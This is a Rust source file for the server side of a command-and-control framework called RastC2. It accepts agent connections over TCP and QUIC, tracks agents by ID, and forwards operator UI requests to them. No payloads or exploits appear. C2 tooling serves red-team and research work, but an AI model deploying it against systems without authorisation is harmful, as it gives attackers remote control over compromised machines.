//! C2 implementation.

use std::{collections::HashMap, net::SocketAddr, sync::Arc, vec};
use bidirectional_channel::ReceivedRequest;
use futures_util::{sink::SinkExt, stream::StreamExt};
use rast::{encoding::JsonPackager, protocols::{
    quic::QuicFactory, tcp::TcpFactory, Messager, ProtoConnection, ProtoFactory, ProtoServer,
}, settings::{Connection, Settings}, RastError, Result};
use tokio::{
    sync::{
        mpsc::{unbounded_channel, UnboundedReceiver, UnboundedSender},
        Mutex,
    },
    task::JoinHandle,
};
use tracing::{debug, info, trace};
use ulid::Ulid;
use rast::agent::Agent;
use rast::encoding::{Encoding, Packager};
use rast::messages::{Message, MessageZone};
use rast_agent::messages::{AgentResponse, C2Request};
use crate::c2::ui_manager::UiManager;
use crate::messages::{UiRequest, UiResponse};

mod ui_manager;

#[doc(hidden)]
#[derive(Debug)]
pub enum Dummy {
    Nothing,
}

// TODO: implement
#[doc(hidden)]
pub enum C2Notification {
    AgentConnected(SocketAddr),
    AgentDisconnected(SocketAddr),
}

#[derive(Debug)]
pub struct RastC2 {
    listeners: Vec<JoinHandle<()>>,
    agents: HashMap<Ulid, Agent>,
    connections_rx: UnboundedReceiver<Arc<Mutex<dyn ProtoConnection>>>,
    ui: UiManager,
}

impl RastC2 {
    /// Creates new instance using provided [Settings].
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let (tx, rx) = unbounded_channel();
        let mut servers = vec![];

        for conf in settings.server.agent_listeners.iter() {
            let task = Self::create_listener(conf, tx.clone()).await?;
            servers.push(task);
        }

        let ui = UiManager::with_settings(&settings).await?;

        if servers.is_empty() {
            return Err(RastError::TODO("No servers running.".to_string()));
        }

        let rastc2 = RastC2 {
            listeners: servers,
            agents: HashMap::new(),
            connections_rx: rx,
            ui,
        };

        Ok(rastc2)
    }

    async fn create_listener(
        conf: &Connection,
        tx: UnboundedSender<Arc<Mutex<dyn ProtoConnection>>>,
    ) -> Result<JoinHandle<()>> {
        let listener = match conf {
            Connection::Tcp(tcp_conf) => TcpFactory::new_server(tcp_conf).await,
            Connection::Quic(quic_conf) => QuicFactory::new_server(quic_conf).await,
            _ => Err(RastError::Unknown),
        };

        if let Ok(listener) = listener {
            // info!("Creating agent listener at: {}", server);
            let task = tokio::spawn(async move {
                let tx = tx.clone();
                loop {
                    if let Ok(conn) = listener.get_conn().await {
                        if let Err(e) = tx.send(conn) {
                            debug!("Failed to pass agent connection to C2: {:?}", e);
                        };
                    }
                }
            });
            Ok(task)
        } else {
            Err(RastError::Unknown)
        }
    }

    /// Starts C2 server.
    pub async fn run(&mut self) -> Result<()> {
        info!("RastC2 instance running");
        loop {
            while let Ok(conn) = self.connections_rx.try_recv() {
                info!(
                    "Received agent connection from: {:?}",
                    conn.lock().await.remote_addr()
                );
                self.add_connection(conn).await?;
                trace!("Added agent connection");
            }

            // TODO: should be in separate thread
            while let Ok(req) = self.ui.try_recv_request() {
                trace!("Received UI request");
                if let Err(e) = self.handle_ui_request(req).await {
                    debug!("Failed to handle UI request: {:?}", e);
                };
            }
        }
    }

    // #[tracing::instrument]
    async fn add_connection(&mut self, conn: Arc<Mutex<dyn ProtoConnection>>) -> Result<()> {
        let agent = Agent::with_connection(conn).await?;
        self.agents.insert(agent.get_ulid(), agent);
        Ok(())
    }

    async fn send_message(&self, conn: Arc<Mutex<dyn ProtoConnection>>, msg: &Message) -> Result<Message> {
        let mut conn = conn.lock().await;
        let mut messager = Messager::with_packager(&mut *conn, JsonPackager);

        if let Err(e) = messager.send(msg).await {
            return Err(RastError::TODO(format!("Failed to send message {e}")));
        };
        messager.receive().await
    }

    async fn send_request(&self, ulid: &Ulid, msg: &C2Request) -> Result<AgentResponse> {
        let agent = self
            .agents
            .get(ulid)
            .ok_or_else(|| RastError::TODO("Agent not found".to_string()))?;
        let msg = Message::new(MessageZone::External(agent.get_ulid()), Encoding::Json, JsonPackager::encode(msg)?.into());
        let conn = agent.get_connection().await
            .ok_or(RastError::TODO("Agent does not have valid connection".to_string()))?;
        let response = self.send_message(conn, &msg).await?;
        JsonPackager::decode(&response.data)
    }

    async fn handle_ui_request(&self, req: ReceivedRequest<UiRequest, UiResponse>) -> Result<()> {
        trace!("{:?}", req.as_ref());
        let response = match req.as_ref() {
            UiRequest::Ping => UiResponse::Pong,
            UiRequest::GetAgents => {
                let ips = self.agents.keys().cloned().collect();
                UiResponse::Agents(ips)
            }
            UiRequest::AgentRequest(ulid, c2req) => {
                let response = self.send_request(ulid, c2req).await.unwrap_or_else(|e| {
                    AgentResponse::Error(format!("{:?}", e))
                });
                UiResponse::AgentResponse(response)
            }
        };
        trace!("UiResponse {:?}", response);
        let result = req.respond(response);
        trace!("UiResponse result {:?}", result);
        Ok(())
    }
}
